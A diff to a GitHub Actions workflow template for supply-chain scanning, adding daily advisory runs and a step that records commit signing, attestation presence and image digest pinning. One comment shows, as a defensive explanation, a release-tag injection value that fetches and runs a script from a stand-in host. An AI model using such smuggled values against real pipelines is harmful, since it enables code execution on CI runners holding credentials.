@@ -45,7 +45,17 @@
   schedule:
     # New advisories land against dependencies that have not changed, which is
     # the one way this capability's answer goes stale without a commit.
-    - cron: "<< config.schedule_cron | default('23 4 * * 1') >>"
+    #
+    # Daily, not weekly. That rationale above argues for the shortest cadence
+    # the budget allows and the default contradicted it: a Monday-only run
+    # meant an advisory published on a Tuesday sat unseen for six days against
+    # a dependency nobody had touched. Every other input to a risk decision
+    # here refreshes at least daily, so the dependency answer was the stalest
+    # thing in the score.
+    #
+    # 04:23 rather than on the hour, and away from the containers lane's 02:41,
+    # so the two do not contend for a runner.
+    - cron: "<< config.schedule_cron | default('23 4 * * *') >>"
   workflow_dispatch:
 {% endblock %}
 
@@ -314,6 +324,83 @@
 {% endblock %}
 
 {% block post_upload %}
+      - name: Observe how this repository builds
+        # Spec 29 §3. Every trust-score term before these was a fact about
+        # *dependencies*; nothing scored the integrity of the repository's own
+        # outputs — whether its commits are signed, whether its artefacts
+        # carry an attestation, whether what it deploys is pinned by digest
+        # rather than by a tag somebody can move underneath it.
+        #
+        # Its own step with `continue-on-error`, rather than `|| true` buried
+        # inside the report step below. Two reasons, and the second is the
+        # real one: a blanket `|| true` on a scanner step is how a failed scan
+        # comes to look like a clean one, which `test_adapters_phase2` fails
+        # the build over — and a step that was refused shows as skipped in the
+        # Actions UI, where a swallowed exit code shows as nothing at all.
+        #
+        # **Every observation may be absent, and absent means "not
+        # determined", never "no".** A repository whose default branch this
+        # token cannot read has not failed the signing check. Scoring the two
+        # the same way turns a permissions problem into a supply-chain
+        # verdict, so the platform records null and says so in the term.
+        id: provenance
+        if: always()
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+          # Bound rather than interpolated. A tag name is chosen by whoever
+          # cut the release, and `${{ }}` in a `run:` body is substituted
+          # before bash parses it — which is how a tag called
+          # `x"; curl evil.sh | sh; #` becomes a command on a runner holding
+          # this job's ingestion token. `test_adapters_phase2` fails the build
+          # over exactly this, and caught it here.
+          TAG: ${{ github.event.release.tag_name }}
+        run: |
+          set -uo pipefail
+
+          SIGNED='{}'
+          COMMITS=$(gh api "repos/${{ github.repository }}/commits?sha=<< default_branch >>&per_page=100" \
+            --jq '[.[] | .commit.verification.verified]' 2>/dev/null)
+          if [ -n "$COMMITS" ] && [ "$COMMITS" != "null" ]; then
+            SIGNED=$(printf '%s' "$COMMITS" | jq -c \
+              'if length == 0 then {}
+               else {signed_commits_ratio: ((map(select(.)) | length) / length),
+                     signed_commits_sampled: length} end')
+          fi
+
+          # Presence only. Verifying an attestation's contents is a larger
+          # piece of work, and the field is named `attestation_present` so a
+          # repository never reads as attested on one that does not verify.
+          # Asked only on a release: a commit with no published artefact has
+          # nothing to attest, and reporting `false` for it would penalise
+          # every ordinary push.
+          ATTESTED='{}'
+          if [ -n "$TAG" ]; then
+            if gh api "repos/${{ github.repository }}/attestations/sha256:${{ github.sha }}" \
+                 >/dev/null 2>&1; then
+              ATTESTED='{"attestation_present": true}'
+            else
+              ATTESTED='{"attestation_present": false}'
+            fi
+          fi
+
+          # Read from the deployment manifests the IaC lane already scans. A
+          # repository with none leaves this absent rather than false: it has
+          # not failed a deployment check, it has no deployment here to check.
+          PINNED='{}'
+          IMAGES=$(grep -rhI --include='*.yml' --include='*.yaml' -e 'image:' . 2>/dev/null | head -200)
+          if [ -n "$IMAGES" ]; then
+            TAGGED=$(printf '%s\n' "$IMAGES" | grep -vc '@sha256:')
+            if [ "${TAGGED:-1}" -eq 0 ]; then
+              PINNED='{"digest_pinned_deployment": true}'
+            else
+              PINNED='{"digest_pinned_deployment": false}'
+            fi
+          fi
+
+          jq -nc --argjson a "$SIGNED" --argjson b "$ATTESTED" --argjson c "$PINNED" \
+            '$a + $b + $c' | { read -r LINE; echo "signals=$LINE" >> "$GITHUB_OUTPUT"; }
+
       - name: Report supply-chain evidence
         # Always, so a scan that failed still records what it managed to see
         # rather than leaving the repo with stale evidence and no sign of it.
@@ -345,6 +432,8 @@
           # shellcheck disable=SC2086  # deliberate word splitting
           ECOSYSTEMS=$(python -m mykronos.atlas_counts osv.json $SBOM_ARGS)
 
+          SIGNALS='${{ steps.provenance.outputs.signals || '{}' }}'
+
           PROVENANCE=$(jq -nc \
             --arg builder "github-actions" \
             --arg repo "${{ github.repository }}" \
@@ -361,7 +450,9 @@
             --arg sbom "$SBOM_REF" \
             --argjson ecosystems "$ECOSYSTEMS" \
             --argjson provenance "$PROVENANCE" \
-            '{commit_sha: $commit, ecosystems: $ecosystems, provenance: $provenance}
+            --argjson signals "$SIGNALS" \
+            '{commit_sha: $commit, ecosystems: $ecosystems, provenance: $provenance,
+              provenance_signals: $signals}
              + (if $tag == "" then {} else {tag_or_release: $tag} end)
              + (if $sbom == "" then {} else {sbom_ref: $sbom} end)')
 
